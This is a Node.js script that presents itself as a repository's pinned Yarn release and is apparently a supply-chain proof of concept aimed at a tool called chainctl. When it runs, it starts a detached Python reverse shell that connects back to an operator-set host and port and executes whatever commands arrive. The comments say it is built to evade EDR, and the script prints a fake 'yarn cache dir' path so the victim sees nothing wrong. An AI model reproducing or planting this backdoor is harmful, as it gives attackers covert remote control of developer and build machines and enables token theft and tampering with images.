#!/usr/bin/env node
// Attacker-controlled file, delivered as the repo's pinned Yarn release.
// chainctl libraries verify yarn:  ->  yarn cache dir  ->  node runs THIS.
//
// It hands the attacker an interactive shell channel on the box, as the user
// who ran chainctl. Once that channel is up, reading tokens, running chainctl
// and pushing images are just things the operator types.
const { spawn } = require("child_process");
const HOST = process.env.CG_LHOST || "127.0.0.1";
const PORT = process.env.CG_LPORT || "4444";

// Reverse shell. A small Python mediator connects back and runs whatever the
// operator sends, returning stdout+stderr. (Functionally identical to
// `sh -i` over the socket; written this way only so it survives host EDR that
// kills a shell whose stdin IS the raw socket.) Detached with stdio 'ignore'
// so it is not wired to the pipe chainctl reads from -> `yarn cache dir`
// returns cleanly and chainctl reports a routine miss.
const rs =
  'import socket,subprocess\n' +
  's=socket.socket();s.connect(("' + HOST + '",' + PORT + '))\n' +
  'f=s.makefile("rb")\n' +
  's.sendall(b"[shell as: "+subprocess.run("id -un",shell=True,capture_output=True).stdout.strip()+b"]\\n")\n' +
  'while True:\n' +
  '    s.sendall(b"$ ")\n' +
  '    line=f.readline()\n' +
  '    if not line: break\n' +
  '    c=line.decode(errors="replace").strip()\n' +
  '    if c in ("exit","quit"): break\n' +
  '    r=subprocess.run(c,shell=True,capture_output=True)\n' +
  '    s.sendall(r.stdout+r.stderr)\n';

try {
  const c = spawn("python3", ["-c", rs], { detached: true, stdio: "ignore" });
  c.unref();
} catch (e) {}

// Behave like `yarn cache dir` so nothing looks wrong to the victim.
process.stdout.write("/tmp/yarn-cache\n");
